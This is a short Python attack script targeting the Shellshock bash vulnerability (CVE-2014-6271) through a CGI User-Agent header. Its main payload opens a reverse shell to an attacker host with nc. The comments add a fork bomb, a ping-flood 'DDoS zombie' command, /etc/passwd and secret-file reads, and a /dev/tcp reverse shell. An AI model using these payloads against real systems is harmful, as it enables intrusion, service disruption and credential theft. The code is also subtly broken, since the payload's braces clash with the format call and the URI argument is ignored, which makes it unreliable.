#!python3
# a simple script to exploit shellshock (CVE-2014-6271) vulnerability
# reverse ncat shell connection to attacker ip
# if the target host does not have ncat installed (recon) then use the alterative payload

# example: python shellshock.py -t TARGET_IP -u /cgi/test.cgi -r ATTACKER_IP -p ATTACKER_PORT

# other payload options:
#   fork bomb - () { :; }; :(){ :|: & };:
#   DDoS zombie - () { :; }; ping -s 1000000 <victim IP>
#   data theft:
#       - () { :; }; cat ~/.secret/passwd
#       - () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd
#
#   reverse tcp shell - () { ignored;};/bin/bash -i >& /dev/tcp/<rhost>/<rport> 0>&1"

# TODO: add customizable attack vectors

import requests
import argparse
import traceback


def main():
    
    # reverse shell payload
    payload = '() { :; }; /bin/bash -c "nc -v {} {} -e /bin/bash -i"'.format(args.remote, args.port)
    try:
        print("Attacking {}".format(args.target))
        headers = {"Content-type": "application/x-www-form-urlencoded",
                "User-Agent": payload}
        req = requests.get(args.target, headers=headers).text
        print(req)

    except Exception as e:
       traceback.print_exc()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Exploit shellshock vulnerability")
    parser.add_argument("-t", "--target", help="Target IP", required=True)
    parser.add_argument("-u", "--uri",  help='Target URI', required=True)
    parser.add_argument("-r", "--remote", help="Attacker IP to connect back with a shell", required=True)
    parser.add_argument("-p", "--port", help="Attacker port for using in reverse shell", required=True)

    args = parser.parse_args()
    main()
